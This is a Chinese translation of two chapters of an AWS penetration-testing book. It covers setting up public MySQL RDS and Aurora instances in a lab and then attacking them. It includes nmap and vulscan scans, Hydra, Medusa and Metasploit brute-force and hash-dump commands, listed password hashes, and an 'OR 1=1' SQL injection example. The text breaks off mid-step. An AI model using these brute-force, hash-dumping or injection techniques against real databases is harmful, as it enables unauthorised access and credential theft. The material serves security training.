# AWS 渗透测试（二）

> 原文：[`annas-archive.org/md5/FFEC848CC6CB35A19A9CEB4325235FE9`](https://annas-archive.org/md5/FFEC848CC6CB35A19A9CEB4325235FE9)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第五章：了解易受攻击的 RDS 服务

亚马逊**关系数据库服务**（**RDS**）提供了可扩展且易于设置的基于云的数据库，允许用户像操作典型数据库一样操作它们。RDS 使用户能够通过 MySQL 和 Amazon Aurora 等服务与数据库交互，就像用户在标准物理数据库基础设施中一样。RDS 的缺点与常规数据库相同-注入和配置错误。

在本章中，我们将讨论 RDS 的一些关键点，并使用 MySQL 设置 RDS 数据库。设置完数据库后，我们将对其进行扫描，然后使用它来应用语法，并学习必要的“动作”和命令，使我们能够在一个小的 MySQL 数据库中进行导航。之后，我们将看一下弱密码的严重性，通过暴力破解登录凭据，并最后了解**SQL 注入**（**SQLi**）是什么，以及它对数据库的影响。

在本章中，我们将学习以下内容：

+   了解 RDS

+   设置 RDS（MySQL）

+   了解基本的 SQL 语法

+   数据库操作和探索

+   了解配置错误

+   了解注入点

# 技术要求

要按照本章的说明进行操作，您需要以下内容：

+   **Nmap**：[`nmap.org/download.html`](https://nmap.org/download.html)

+   **Hydra**：[`github.com/vanhauser-thc/thc-hydra`](https://github.com/vanhauser-thc/thc-hydra)

+   **Medusa**：[`github.com/jmk-foofus/medusa`](https://github.com/jmk-foofus/medusa)

+   **Vulnscan**：[`github.com/scipag/vulscan`](https://github.com/scipag/vulscan)

查看以下视频以查看代码的实际操作：[`bit.ly/35Va2KH`](https://bit.ly/35Va2KH)

# 了解 RDS

RDS 允许用户架设、扩展和操作关系数据库服务，而无需处理架设自己的数据库服务器所带来的所有麻烦。除了不必在本地分配硬件和资源外，RDS 旨在降低所有权成本，从而使公司能够更多地专注于自己的业务目标，减少对技术需求的担忧。自行托管数据库往往需要大量的时间、金钱和人力资源- RDS 使所有者只需要创建和配置他们的云数据库设置。

让我们快速看一下使用 RDS 的一些优势。

## 使用 RDS 的优势

RDS 是架设基础设施数据库的一个很好的方式，有许多好处和优点。除了我们已经简要提到的一些优点之外，了解如何使用 AWS 及其相关服务快速且安全地扩展是很重要的。

让我们快速看一下 RDS 相对于其他数据库服务具有影响力优势的一些要点：

+   **快速**：只需点击几下，您就拥有了自己的数据库！不要担心我们目前没有进行任何实际操作，我们将在本章中大量使用 RDS。

+   **安全**：**数据在静止**和**数据在使用**都是加密的。

--**数据在使用**是当前从一个源传输到另一个源的数据。这些数据的安全性很重要，因为有人可能会进行**中间人**攻击（**MiTM**）。中间人攻击是指攻击者能够在数据在传输过程中访问数据。然后，攻击者会检索未加密的数据，并用于恶意目的。

--**数据在静止**是当前存储的数据-包括备份。攻击者不应能够访问或查看这些数据。静止的未加密数据会产生很大的风险，可以允许攻击者在数据被窃取时查看数据。

--数据库实例将自动进行补丁。一些选项允许手动管理补丁-可以想象，如果不应用补丁，这可能会导致安全问题。

+   **易于管理**：能够通过 AWS Web 控制台集中控制所有数据库使事情变得非常无缝。然而，重要的是数据库管理员确保他们跟上不断更新和扩展的需求。

+   **可扩展的**：只需点击几下，您就可以扩展数据库以满足您的需求。这使您能够以更少的麻烦扩展基础架构，因为不必购买大量的硬件。

RDS 为选择它而不是在本地托管它的客户带来的另一个好处是成本效益。公司可以预期通过转移到 AWS 来节省相当多的钱。这在很大程度上是因为不必设置物理基础设施。

从安全的角度来看，不将数据库存储在本地意味着您不必担心物理访问控制和物理安全 - 这也是节省成本。AWS 共享安全模型确保亚马逊将承担物理设备的所有权，包括这些设备的物理安全。

现在让我们更专注地看一些服务，以便了解 RDS 中托管了哪些类型的服务。我们将提到的两种服务是 MySQL 和 Aurora。

## MySQL

MySQL 是一种基于和围绕**结构化查询语言**（SQL）的标准数据库。这种全面的数据库已经成为一种相当普遍的用作 Web 数据库的选择，作为 Web 应用程序的后端数据库。因此，有可能当您在线购物时，您正在与一个 MySQL 数据库进行交互。

虽然这在本节中并不相关，但重要的是要知道我们将在整本书中都使用 MySQL。我们将研究各种数据库系统，并了解这些系统使用的语法。

## Aurora

Aurora 是一个与 MySQL 和 PostgreSQL 兼容的关系数据库，专为耐久性和速度而构建。它被认为比其他数据库（如 MySQL 和 PostgreSQL）快得多，并提供了我们提到的 RDS 的相同优势。它是根据其他 AWS 组件构建的，例如以下内容：

+   S3

+   EC2

+   VPC 和更多...

它也由 RDS 管理，这意味着它们使用了与 AWS 相关的相同管理和管理员功能。我们将深入研究设置 Aurora 并在*第六章**，设置和渗透测试 AWS Aurora RDS*中进行测试。现在我们已经了解了一些关于 RDS 的信息，让我们看看如何实际设置 RDS 数据库。

# 设置 RDS（MySQL）

要设置 RDS 数据库，我们将使用一个较旧版本的 MySQL。您将在 AWS 控制台中来回移动，因此请确保将 RDS 图标固定在您的 AWS 控制台中：

![图 5.1 – 将 RDS 固定为快捷方式](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.01_B15630.jpg)

图 5.1 – 将 RDS 固定为快捷方式

之后，确保您在本书中一直在使用的地区，并继续创建数据库。请记住，重要的是我们选择一直在本书中使用的地区。这样可以确保我们所有的资源都保持在同一个地方。

按照下面的说明创建您自己的 RDS 实例：

1.  点击您创建的**RDS**图标，然后选择**创建数据库**：![图 5.2 – 创建新数据库](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.02_B15630.jpg)

图 5.2 – 创建新数据库

1.  接下来，您需要选择一个数据库 - 我们将使用**MySQL**。确保使用较旧的版本，如果没有最旧版本的话：![图 5.3 – 选择 MySQL](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.03_B15630.jpg)

图 5.3 – 选择 MySQL

1.  之后，您将获得一个模板供选择。我们希望避免收费，因此请选择**免费层**选项：![图 5.4 – 选择免费层](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.04_B15630.jpg)

图 5.4 – 选择免费层

1.  接下来，设置 RDS 实例的名称、用户名和密码：![图 5.5 – 创建用户名和密码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.05_B15630.jpg)

图 5.5 - 创建用户名和密码

1.  确保您已选择了数据库公开的选项：

![图 5.6 - 使 RDS 实例公开](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.06_B15630.jpg)

图 5.6 - 使 RDS 实例公开

您现在拥有一个正在运行的 RDS 数据库！它需要一些时间来完成创建 - 一旦完成创建，您就可以通过 MySQL 访问它。

我们的实例已经启动运行，现在让我们添加一个规则到我们的安全组，允许默认的 MySQL 端口`3306`打开并允许流量到实例。

## 向安全组添加规则

我们的实例已经启动，但还没有准备好。现在您需要确保通过端口`3306`允许入站流量 - 这是我们将要访问实例的端口。

要这样做，请按照以下步骤：

1.  点击数据库中的安全组：![图 5.7 - 创建安全组](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.07_B15630.jpg)

图 5.7 - 创建安全组

1.  点击**VPC 安全组**。

1.  点击安全组 ID。

1.  创建允许`3306`的入站规则：

![图 5.8 - 编辑规则](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.08_B15630.jpg)

图 5.8 - 编辑规则

现在您将被允许从您的计算机连接到数据库。接下来，让我们看一下如何测试连接到我们新设置的数据库。

## 测试连接

一旦您的数据库启动并运行，确保您可以连接到它总是一个很好的健全检查 - 即使您暂时不打算使用它。为了测试连接到我们的新数据库，让我们在 Kali 中打开一个终端，并使用`mysql`来访问我们的数据库：

```
$ mysql -h <<RDS INSTANCE>> -P 3306 -u admin -p
```

以下截图显示了前面命令的输出：

![图 5.9 - 连接到 RDS](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.09_B15630.jpg)

图 5.9 - 连接到 RDS

我们现在与数据库建立了稳定的连接！在扫描服务器之后，我们将看一下在数据库中移动。

现在我们了解了如何连接到我们的数据库，让我们看一下在渗透测试中如何扫描我们的数据库。

## 扫描 RDS

现在我们的 RDS 数据库已经启动运行，让我们看一下如何对其执行各种扫描。这些技术正是我们在渗透测试中使用的技术，可以帮助我们了解更多关于我们在实验室环境中的*目标*。

以下步骤将帮助我们实现这些结果：

1.  假设这是一个“现实生活”的渗透测试。我们想要做的第一件事是检查我们的目标并查看哪些端口是开放的。为了枚举任何信息，我们需要在主机上运行*基本扫描*：

```
$ nmap -vv -Pn <<RDS INSTANCE>>
```

这将给出以下输出：

![图 5.10 - 实例上打开了端口 3306](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.10_B15630.jpg)

图 5.10 - 实例上打开了端口 3306

1.  接下来，我们运行版本扫描，查看端口上运行的软件版本：

```
$ nmap -p 3306 -Pn -sV <<RDS INSTANCE>>
```

这将给出以下输出：

![图 5.11 - 端口 3306](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.11_B15630.jpg)

图 5.11 - 端口 3306

1.  接下来，我们使用 Metasploit 确认软件版本：

```
$ use auxiliary/scanner/mysql/mysql_version
$ set rhosts <<RDS INSTANCE>>
$ exploit
```

这将给出以下输出：

![图 5.12 - 使用 Metasploit 扫描 MySQL 版本](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.12_B15630.jpg)

图 5.12 - 使用 Metasploit 扫描 MySQL 版本

太好了，现在我们知道正在运行的版本！

枚举阶段的下一部分是查看与该版本相关的 CVE。我们将使用 Nmap 内置的脚本查看一些列出的 CVE。

重要提示

CVE 提供了各种漏洞和利用的参考，您可能在评估过程中找到。您可以在这里找到更多关于 CVE 的信息：https://cve.mitre.org/。

接下来，让我们拉取一个新的 CVE 存储库，并使用更新的 CVE 存储库运行 Nmap 扫描。

以下步骤将指导我们：

1.  首先，您需要从 GitHub 获取以下内容：[`github.com/scipag/vulscan`](https://github.com/scipag/vulscan)。

我们可以使用`git clone`命令来执行它：

```
$ git clone https://github.com/scipag/vulscan scipag_vulscan
 $ ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
```

1.  然后运行您的扫描：

```
$ nmap -sV --script=vulscan/vulscan.nse -p 3306 <<RDS INSTANCE>>
```

这将给您以下输出：

![图 5.13 - 来自 Vulnscan 的信息](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.13_B15630.jpg)

图 5.13 - 来自 Vulnscan 的信息

我们可以看到扫描的输出显示了我们可以查找的各种 CVE。你可以在 MITRE 数据库中查找 CVE：[`cve.mitre.org/`](https://cve.mitre.org/)。CVE 是一个相当深入的话题，会偏离这本书的主题，所以最好简单理解 CVE 是你在渗透测试中可能发现的漏洞和利用的参考。

正如你所看到的，有各种各样的扫描方式 - 我的意思是皮毛 - 一只猫！扫描主机可以让你看到任何开放的服务和端口，这可能是对服务器的一个可能的立足点。在渗透测试中，没有一个端口被忽视，也没有一个服务被遗漏。枚举是关键，扫描可以是枚举中最重要的策略！

现在让我们看一些 SQL 语法的快速参考，这将帮助我们在本章的其余部分中移动。

# 了解基本的 SQL 语法

了解 SQL 语法非常重要，特别是现在我们将通过 MySQL 与 SQL“shell”进行交互。基本上，语法是系统、应用程序和设备的语言，所以你非常重要知道一些基础知识以及如何使用语法。

以下是属于 MySQL 语法的基本命令列表：

+   `SELECT`：从数据库中提取数据

+   `UPDATE`：更新数据库中的信息

+   `DELETE`：从数据库中删除数据

+   `显示`：在数据库或表中显示数据

+   `使用`：切换到一个数据库

+   `INSERT INTO`：向数据库中插入新数据

+   `CREATE DATABASE`：创建一个新数据库

+   `ALTER DATABASE`：修改数据库

+   `CREATE TABLE`：创建一个新表

现在你知道了一些简单的语法，让我们继续应用它，并开始在我们的新数据库中移动。

# 数据库操作和探索

了解如何在数据库中移动不仅对渗透测试很重要，对于技术人员来说也非常重要。数据库被所有东西使用，你会遇到数据库的次数比你自己的份额还要多，所以重要的是你了解如何使用它们的语法。此外，如果你不知道你要去哪里，那么你怎么到达那里？如果你甚至不知道从哪里开始？如果你不将你的知识应用于实际测试，那在 MySQL 中移动就会变得像这样。既然我们提到了语法，让我们在下一部分中实际使用它。首先，确保你连接到你的 RDS 数据库。连接后，继续进行下一步。

假设这是一个真正的渗透测试，你被授予对数据库的访问权限，但需要找到配置错误。当获得对服务器的访问权限时，你首先要做的事情是显示服务器上的所有数据库。

让我们使用一些命令来帮助我们在数据库中操作：

1.  让我们看看我们实例中的数据库：

```
$ show databases;
```

这将给我们以下输出：

![图 5.14 - 列出 RDS 中的数据库](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.14_B15630.jpg)

图 5.14 - 列出 RDS 中的数据库

1.  很好，现在我们知道服务器上有哪些数据库。接下来，让我们看看 MySQL 数据库 - 这通常存储用户名和密码：

```
$ use mysql;
```

1.  接下来，让我们看看该数据库中的表：

```
$ show tables;
```

显示以下表：

![图 5.15 - 显示表](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.15_B15630.jpg)

图 5.15 - 显示表

1.  你会看到一个名为`user`的表。继续显示该表中的数据：

```
$ SELECT * FROM user;
```

这将给我们以下输出：

![图 5.16 - 列出用户表中的信息](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.16_B15630.jpg)

图 5.16 - 列出用户表中的信息

你会得到一些数据，看起来像我们截图中所示的一团糟。如果你看一下，你可以看到每个用户名及其哈希值。默认情况下，MySQL 使用 SHA-1 哈希。

现在，让我们确保我们通过查询只看到了用户：

```
$ select user from user;
```

这将给我们以下输出：

![图 5.17 - 以人类可读文本显示的用户](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.17_B15630.jpg)

图 5.17 - 以人类可读文本显示的用户

正如你所看到的，我们有用户名和他们的哈希：

+   `rdsadmin`:`*AAEED912FFD9F3EBB625FBE039BB2A88FB8C4187`

+   `mysql.sys`:`*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE`

+   `admin`:`*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19`

继续前进，让我们看看是否有更自然的方式来查看终端中的用户名和哈希。在渗透测试中，能够有效地用一个截图说明一种技术是一个好的实践。这样做有助于让你的客户理解，并在放入报告时显得更专业。

我们可以通过使用 Metasploit 来转储哈希。让我们继续看看我们如何做到这一点。

## 使用 Metasploit 转储哈希

转储哈希是从用户那里获取密码的好方法。虽然哈希本身不是密码，但它们可以被破解或用于“哈希”传递攻击 - 一种允许你使用哈希密码进行身份验证的技术。

要执行我们的`hashdump`，我们需要使用`mysql_hashdump`并设置参数以适应你的目标。确保你使用数据库的用户名和密码：

![图 5.18 - 转储哈希](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.18_B15630.jpg)

图 5.18 - 转储哈希

正如你所看到的，我们已经成功转储了数据库哈希，并可以提供一个更简洁的截图，可以被嵌入到渗透测试报告中。

现在我们已经找到了在数据库中移动和定位用户和密码的方法，让我们继续前进，看看我们如何创建数据库并在渗透测试中使用**蛛丝马迹**。

## 创建 RDS 数据库

在进行渗透测试时，留下**蛛丝马迹**是很常见的。这些蛛丝马迹通常被称为**遗物**，它们在内部留下，以便让客户知道他们确实进入了他们所说的系统。此外，当渗透测试人员在几个月后重新访问系统时，他们将通过遗物是否被移除来知道系统是否已修复。如果遗物仍然存在，这是一个很好的指示，表明系统的问题没有得到解决 - 通常是因为管理员在解决问题时会移除遗物。

对于我们的 MySQL 服务器，我们将创建一个名为`pentest`的数据库。如果这是一个真实的任务，它只会被留下作为一个*我在这里*的声明：

1.  连接到你的数据库并输入以下命令来创建数据库：

```
$ create database pentest;
```

1.  现在你已经创建了一个数据库，最好再次检查并确保它被正确创建：

```
$ show databases;
```

以下截图将向你展示输出：

![图 5.19 - 显示我们的新数据库](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.19_B15630.jpg)

图 5.19 - 显示我们的新数据库

现在我们已经建立了一个数据库，我们对 RDS、MySQL 有了更多的了解，以及我们如何操作数据库。现在让我们讨论一些常见的配置错误，并进行一个实际的暴力破解练习，以真正了解由配置错误引起的问题。

# 理解配置错误

如果不及时有效地纠正，配置错误可能会导致数据库的终结。这些问题往往是由于管理员的不良操作或缺乏知识所引起的。数据库中留下的漏洞是恶意黑客的宝藏，也是渗透测试人员的乐趣，然而，仅仅因为它们对渗透测试人员有趣，并不意味着它们应该存在！

让我们看看你在技术生涯中可能会遇到的一些常见问题。

## 弱密码

弱密码通常源自默认密码或常见密码。在这里了解更多关于弱密码的信息：https://cwe.mitre.org/data/definitions/521.html。弱密码通常很容易被猜到。以下是一些被认为是弱密码的密码列表：

+   管理员

+   密码

+   12345qwer

+   Password123

+   根

为了帮助说明弱密码有多危险，让我们看一些工具，我们可以用来暴力破解我们最近创建的 RDS 数据库上管理员帐户的弱密码。

### Hydra

Hydra 是一个很棒的工具，当您需要破解登录密码时可以使用它-它对各种协议都很快速、简单且灵活。在我们的情况下，我们将使用它来暴力破解我们的 RDS 数据库登录。

在开始之前，请确保您有一个短密码列表可用于针对 RDS 登录进行测试。我建议使用大约 10 个密码并将它们存储在`.txt`文件中。创建密码文件后，使用以下命令使用已知密码`admin`和密码列表来暴力破解数据库：

```
$ hydra -l admin -P passwords.txt <<RDS INSTANCE>> mysql
```

这将给我们以下输出：

![图 5.20 - 使用 Hydra 暴力破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.20_B15630.jpg)

图 5.20 - 使用 Hydra 暴力破解

正如您所看到的，Hydra 以绿色显示找到的密码和用户名-这样我们更容易阅读。现在让我们看看另一个工具，Medusa。

### Medusa

Medusa 与 Hyrda 相同-它是一个用于暴力破解登录凭据的出色且快速的工具。就像以前一样，让我们使用我们的密码列表和已知用户名来暴力破解我们的 RDS 登录：

```
$ medusa -h <<RDS INSTANCE>> -u admin -P /root/passwords.txt -M mysql
```

这将给我们以下输出：

![图 5.21 - 使用 Medusa 暴力破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.21_B15630.jpg)

图 5.21 - 使用 Medusa 暴力破解

注意最后一行显示`ACCOUNT FOUND`，表明已找到用户名和密码。

### Metasploit

Metasploit 还内置了一个很棒的模块，让我们使用暴力破解！就像以前一样，使用您的密码列表和已知用户名来暴力破解登录！要找到该模块，请搜索`mysql_login`扫描程序并针对您的 RDS 实例：

![图 5.22 - 使用 Metasploit 暴力破解](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_5.22_B15630.jpg)

图 5.22 - 使用 Metasploit 暴力破解

您现在有一些时间来查看数据库中的各种问题，同时也为弱密码进行渗透测试。如果您检查工具的输出，您将看到`LOGIN FAILED`这些词，这表明我们未能成功获取凭据。但是，如果您查看显示`SUCCESS`的输出，您将看到已找到凭据`admin:password`。

现在让我们更多地讨论一些我们在数据库中看到的问题，其中一些您可能在渗透测试职业中发现。

## 未打补丁的数据库

未打补丁的系统是一个重大问题，有时对恶意黑客来说可能很容易。那么为什么公司不打补丁他们的系统或启用自动打补丁呢？不幸的是，情况并不那么简单。许多公司在打补丁时面临问题，因为特定的补丁对其系统和应用程序产生不利影响。此外，打补丁需要时间，可能会导致服务器停机。如果服务器停机，通常意味着组织的收入损失。

这就是为什么渗透测试现在成为如此重要的职业领域。公司在不断更新其安全姿态方面遇到问题，似乎几乎不可能查看所有内容。渗透测试通过不断寻找未打补丁的系统并利用漏洞来帮助缓解这一问题。这样做可以让公司评估与未打补丁系统相关的风险并做出相应的计划。

现在让我们开始总结，但在此之前，我们将快速看一下注入。注入是在允许访问后端数据库的 Web 应用程序中发现的最具影响力的漏洞之一。

# 学习注入点

虽然在本章中我们不会进行任何关于注入的“实践”，但了解注入是什么，它是如何工作的，以及为什么它仍然是 Web 应用程序中的顶级问题之一是至关重要的。在*第六章**，设置和渗透测试 AWS Aurora RDS*中，我们将看到注入的更多实际实现，当我们设置一个易受 SQL 注入攻击的环境时。

## 什么是注入？

注入是应用程序中的一个缺陷，允许执行恶意语句。虽然它可能看起来“不那么邪恶”，但这些语句可以是实际控制数据库的语句 - 最终使未经授权的用户控制系统。这意味着如果不加以纠正，该缺陷可能允许恶意用户访问敏感数据，甚至完全接管数据库。

## 它是如何工作的？

首先，需要找到一个入口点；这通常是 Web 页面或 Web 应用程序中的一个易受攻击的输入部分。易受攻击的入口点通常直接访问 SQL 数据库，并允许用户进行直接从数据库查询的查询。一旦发现，恶意有效载荷将被发送到数据库并在服务器端执行。让我们看一个**概念验证**（**POC**），它说明了一个非常基本的注入字符串，将允许未经授权的查询用户名和密码。

### 伪代码

在这个例子中，我们将使用伪代码 - 这不是真正的编码；它是易于阅读的代码，帮助读者理解正在执行的操作。以下字符串是伪代码，这意味着它在实际情况下可能有效，也可能无效。

```
SELECT username FROM users WHERE username = 'administrator' AND password='password'
```

以下查询将尝试检索管理员用户名和密码，但将失败，因为数据库将看到用户没有权利访问服务器。将其视为一个**FALSE**语句。**FALSE**语句简单地意味着服务器不会执行命令，因为查询不合法（有多种方式它可能是不合法的）。

因此，如果数据库不执行错误命令，这意味着它应该运行一个**TRUE**语句。让我们更改我们的查询使其为**TRUE**：

```
SELECT username FROM users WHERE username = 'administrator' AND password='password' OR 1=1'
```

通过在查询的末尾添加`OR 1=1'`，我们使`1`等于`1` - 使其为真。这样做允许检索管理员的用户名和密码。

重要说明

请记住，伪代码不是真正的代码。伪代码的目的是为可能性制定一个“路线图”。

## 为什么这是一个问题？

如前所述，注入影响企业员工和客户。注入点可以允许从完全控制数据库到泄露敏感信息的任何事情。在建立新数据库时，前端网站对输入进行消毒以帮助防止这类攻击是非常重要的。

# 总结

在本章中，我们学到了关于数据库的很多知识 - 例如 RDS、MySQL 和 Aurora。我们还快速深入了解了 MySQL 语法，以帮助我们更好地理解在交互式 MySQL shell 中执行命令时正在执行的操作。我们学会了如何使用 RDS 设置数据库，并学会了如何在 RDS 数据库中创建数据库。然后，我们学会了如何暴力破解数据库，同时也了解了弱密码对数据库的影响程度。

在下一章中，您将开始使用从本章获得的知识，并在更多的实践中实施它，同时在 AWS 中构建环境。

# 进一步阅读

+   SQL 注入：[`portswigger.net/web-security/sql-injection`](https://portswigger.net/web-security/sql-injection)

+   数据库漏洞：[`www.darkreading.com/vulnerabilities---threats/the-10-most-common-database-vulnerabilities/d/d-id/1134676`](https://www.darkreading.com/vulnerabilities---threats/the-10-most-common-database-vulnerabilities/d/d-id/1134676)


# 第六章：设置和渗透测试 AWS Aurora RDS

AWS Aurora 为 AWS 账户提供了类似 SQL 的数据库功能。以使用 PostgreSQL 和 MySQL 为中心，例如查询，Aurora 使用户可以轻松地与高性能存储系统进行交互。然而，副作用可能会带来致命的代价，如果不充分保护，可能会导致数据泄漏。本章将讨论 Aurora 所提供的内容，以及**SQL 注入**（**SQLi**）的危险 - 这是针对托管 MySQL 等服务的网站的恶意攻击。我们还将讨论**拒绝服务**（**DoS**）和**分布式拒绝服务**（**DDoS**）的缓解和预防。

在本章中，我们将涵盖以下主题：

+   理解和设置 Aurora RDS

+   白盒/功能性渗透测试 Aurora

+   设置 SQLi 实验室

+   与 SQLi 有趣

+   避免 DDoS

# 技术要求

要按照本章的说明进行操作，您将需要以下内容：

+   Juice Shop 将用于创建我们的 SQli 实验室。更多信息可以在这里找到：[`owasp.org/www-project-juice-shop/`](https://owasp.org/www-project-juice-shop/)。

本章中使用的代码可在以下链接找到：

+   [`github.com/bkimminich/juice-shop`](https://github.com/bkimminich/juice-shop)

+   [`raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt`](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt)

查看以下视频以查看代码的实际操作：[`bit.ly/2TIx2qz`](https://bit.ly/2TIx2qz)

# 理解和设置 Aurora RDS

在*第五章*中，*理解易受攻击的 RDS 服务*，我们研究了关系数据库并设置了自己的 RDS 数据库，并实现了 MySQL 作为运行在 RDS 实例上的基础服务。正如你所看到的，设置数据库相对简单，所以现在我们将开始研究 Aurora。

Aurora 的一个好处是简单性，我们将在设置 Aurora 集群时进行研究。因为 Aurora 运行在 RDS 之上，它完成了大部分的*繁重工作*，并允许你与以前一样进行接口。Aurora 的另一个巨大优势是安全性。Aurora 对静态数据和传输数据进行加密。在两个级别进行加密可以确保数据的机密性，无论是存储还是使用。在渗透测试中，诸如**个人可识别信息**（**PII**）之类的数据非常敏感，如果发现未加密，应该立即披露。

重要提示

如果在渗透测试期间发现 PII 未受保护，则渗透测试应该停止并恢复，并立即通知管理人员。

Aurora 兼容 MySQL 和 PostgreSQL。Aurora 的一个伟大之处在于需要 MySQL 和 PostgreSQL 等服务的工具也可以在 Aurora 中运行。Aurora 是使用与 MySQL 和 PostgreSQL 相同或相似的数据库引擎构建的。

接下来，让我们使用一些我们已经掌握的知识来设置 Aurora 和 MySQL 数据库。

## 设置 Aurora

现在，设置 Aurora 应该相对不那么复杂，因为我们已经在 RDS 上设置了数据库。如果还没有，请转到*第五章*，*理解易受攻击的 RDS 服务*，并设置一个数据库，以便了解在 AWS 中设置数据库的步骤。拥有数据库是继续前进所必需的。

就像以前一样，转到 Amazon RDS 控制台，然后单击**创建数据库**开始。接下来，按照以下步骤：

1.  选择**标准创建**：![图 6.1 - 选择标准创建](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.01_B15630.jpg)

图 6.1 - 选择标准创建

1.  选择**具有 MySQL 兼容性的 Amazon Aurora**：![图 6.2 – Aurora 选择](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.02_B15630.jpg)

图 6.2 – Aurora 选择

1.  选择**区域数据库**位置以适应您的位置。

在**数据库特性**屏幕上，选择**一个写入者和多个读取者 - 并行查询**。这是一个很好的方法，因为它允许一个更加冗余的混合工作负载：

![图 6.3 – 一个写入者和多个读取者 - 并行查询](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.03_B15630.jpg)

图 6.3 – 一个写入者和多个读取者 - 并行查询

1.  在**设置**页面上，为您的集群命名。确保您记住这个名字。

1.  设置用户名和密码：![图 6.4 – 为您的新实例创建用户名和密码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.04_B15630.jpg)

图 6.4 – 为您的新实例创建用户名和密码

1.  选择**密码验证**。

1.  点击**创建数据库**：

![图 6.5 – 新的 Aurora 集群](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.05_B15630.jpg)

图 6.5 – 新的 Aurora 集群

就是这样 – 我们已经设置了一个可以使用的 Aurora 数据库集群。尝试连接并测试一些功能，就像您在上一章中测试 MySQL 时所做的那样，*第五章*，*理解易受攻击的 RDS 服务*。

现在我们的 Aurora 实例正在运行，让我们进行一项渗透测试练习，演示一个实际的渗透测试人员如何查看与 Aurora 渗透测试相关的一些*易于攻击*的内容。

重要提示

*易于攻击*是在系统、网络和应用程序中发现的易于利用的漏洞。

# 白盒/功能性渗透测试 Aurora

就像我们之前对 RDS 所做的那样，我们将从渗透测试的角度来看看我们可以从 Aurora 中找到什么。我们知道环境，因为我们设置了它，但是为了下一个练习的缘故，让我们假设我们正在对 Aurora 实例进行渗透测试。这个测试涉及查看实例是否可以被公开访问，密码字段的强度如何，以及在查看实例时我们可能能做的其他任何事情。

我们要这样做的原因是尽可能多地暴露白盒渗透测试方法。白盒渗透测试是最常见的渗透测试方法，因为它允许渗透测试人员完全测试所有功能目的和合规目的。我们将把这个方法应用到我们的 Aurora 实例上。

我们的参与始于扫描 Aurora 实例。请记住，除了实例的地址，我们一无所知！

## 侦察 – 扫描公共访问

像往常一样，我们需要检查实例是否是公共的。我们可以通过使用 NMAP 运行`no ping`扫描来做到这一点：

```
$ nmap -Pn -vv <<aurora instance IP>>
```

这将给我们以下输出：

![图 6.6 – 扫描 Aurora 并发现端口 3306](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/aws-pentest/img/Figure_6.06_B15630.jpg)

图 6.6 – 扫描 Aurora 并发现端口 3306

从前面的屏幕截图中，看起来实例实际上是在端口`3306`上公开访问的，这是 MySQL 服务使用的端口。现在我们知道目标主机的以下信息：

+   正在使用 MySQL。

+   端口`3306`对公众开放。

这些信息非常重要，因为我们知道系统正在使用 MySQL 的默认端口，并且我们知道正在使用的数据库类型。由于它使用默认端口，这可能意味着安全控制措施较少。

重要提示

将端口更改为不同的服务可以通过混淆增加一些安全性。然而，这可能表明目标上可能实施了更多的安全性。

现在，我们可以继续深入研究如何访问 Aurora 实例。这将需要使用用户名和密码列表进行一些暴力破解。

## 枚举用户名和密码

现在我们对正在运行的服务有了更多的信息，我们需要继续并开始攻击这些服务。在我们的白盒渗透测试方法论的下一步中，我们将开始寻找一些弱密码。如果我们发现了用户名和密码，我们就可以直接访问目标。

发现用户名和密码的一个好而快速的方法是尝试使用默认名称来对服务和设备进行攻击。在我们的情况下，我们知道 MySQL 使用默认用户名`admin`。因为我们知道这一点，我们将使用`admin`用户名进行暴力破解，并使用可以在 GitHub 上找到的密码列表，方法如下：

1.  要获取密码列表，请运行以下命令：

```
